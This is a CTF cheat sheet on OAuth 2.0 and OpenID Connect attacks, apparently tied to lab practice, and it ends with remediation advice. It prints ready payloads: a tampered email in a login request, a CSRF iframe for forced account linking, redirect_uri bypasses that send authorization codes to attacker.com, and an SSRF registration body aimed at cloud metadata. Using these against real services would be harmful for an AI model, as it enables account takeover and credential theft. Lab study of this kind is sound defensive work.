# OAuth Authentication — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools, Exploit Server  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

OAuth 2.0 / OpenID Connect allows applications to authenticate users via third-party identity providers (e.g., Google, GitHub, social logins).

1. **Map the Authorization Flow:**
   - Authorization Code Grant: Client requests `/auth?client_id=...&redirect_uri=...&response_type=code&state=...`
   - Implicit Grant: Client receives `access_token` directly in the URL fragment (`#access_token=...`).
2. **Inspect Token Validation:**
   - When the client exchanges the token or submits user details (`POST /authenticate`), does it send an `email` or `username` that can be tampered with directly?
3. **Inspect the `state` Parameter (CSRF Protection):**
   - Is `state` missing, static, or not validated against the user session?
4. **Test `redirect_uri` Tampering:**
   - Can you point `redirect_uri` to an external domain or use path traversal/open redirects to leak the `code`?
5. **Inspect OpenID Connect (OIDC) Configurations:**
   - Check `/.well-known/openid-configuration` for dynamic registration, `jwks_uri`, or SSRF vectors.

---

## 2. High-Yield Attack Vectors

### 1. Client-Side Account Hijacking (Implicit Flow Parameter Tampering)
In flawed implementations of the Implicit flow, the client browser receives an access token and makes a request back to the target's backend:
```http
POST /authenticate HTTP/2
Host: TARGET.net
Content-Type: application/json

{
    "email": "carlos@target.net",
    "token": "ATTACKER_VALID_TOKEN"
}
```
- **Exploitation:** The server trusts the client-provided `email` without verifying with the identity provider whether `token` actually belongs to `carlos`. Change `"email"` to the victim's email address to log in as them.

---

### 2. Forced Account Linking (Missing / Flawed `state` Parameter)
If the OAuth flow does not enforce an unguessable `state` parameter bound to the user session, the flow is vulnerable to CSRF:

1. Initiate the OAuth login/linking process with your own social account.
2. In Burp Proxy, pause/intercept the request right before the authorization code is redeemed:
   ```http
   GET /oauth-callback?code=ATTACKER_CODE HTTP/2
   ```
3. Copy the URL and drop the request in Burp so your code is **not** consumed.
4. Construct a CSRF PoC delivering this URL to the victim:
   ```html
   <iframe src="https://TARGET.net/oauth-callback?code=ATTACKER_CODE"></iframe>
   ```
5. When the victim visits the exploit page, their target account is forcibly linked to your social account.
6. Log in via your social account to access the victim's account.

---

### 3. Stealing Authorization Codes via Flawed `redirect_uri`
The authorization server validates `redirect_uri` against an allowlist, but flawed regexes or directory traversal allow redirection:

#### Attack Patterns:
- **Directory Traversal:**
  ```text
  redirect_uri=https://TARGET.net/oauth-callback/../../post/comment/confirmation?postId=1
  ```
- **Domain Substring / Bypass:**
  ```text
  redirect_uri=https://TARGET.net.attacker.com/oauth-callback
  redirect_uri=https://attacker.com/?TARGET.net
  ```
- **Open Redirect Chaining:**
  If the auth server only allows `https://TARGET.net/oauth-callback`, but that page has an open redirect:
  ```text
  redirect_uri=https://TARGET.net/oauth-callback?url=https://attacker.com
  ```

#### Exploit Delivery:
Craft an authorization link pointing the victim to the vulnerable redirect URI. When the victim authorizes, their `code` is sent to your server:
```html
<script>
    location = "https://oauth-server.net/auth?client_id=123&redirect_uri=https://TARGET.net/oauth-callback/../../post/comment/confirmation?postId=1&response_type=code&scope=openid%20profile%20email";
</script>
```

---

### 4. SSRF via OpenID Dynamic Client Registration
If the OAuth server exposes OpenID Connect dynamic client registration (`POST /openid/register`), you can register a client and provide malicious URLs:
```json
POST /openid/register HTTP/2
Content-Type: application/json

{
    "client_name": "ExploitClient",
    "redirect_uris": ["https://attacker.com/cb"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/"
}
```
When the OAuth server generates a preview or loads the logo, it triggers SSRF against internal cloud metadata.

---

## 3. CTF Quick Reference

| Flaw | Recon Indicator | Exploit Action |
|---|---|---|
| **Tampered Email** | `POST /authenticate` carries email | Change email to victim in body |
| **Missing `state`** | No `state` in `/auth` or `/callback` | CSRF PoC with unused attacker code |
| **Weak `redirect_uri`** | Accepts `../` or subdomain | Point to Exploit Server / open redirect |
| **OpenID SSRF** | `/openid/register` endpoint | Supply `logo_uri: http://169.254.169.254` |

---

## 4. Remediation

- **Enforce Cryptographic `state` Parameter:** Generate an unpredictable, cryptographically random `state` tied to the user's session cookie and validate it upon callback.
- **Strict `redirect_uri` Allowlist:** Perform exact string matches against a pre-registered list of redirect URIs. Reject wildcards, subdomains, and relative paths.
- **Verify Tokens Server-Side:** Never trust user identities passed from client-side code; query the provider's token validation/userinfo endpoint directly from the backend server.
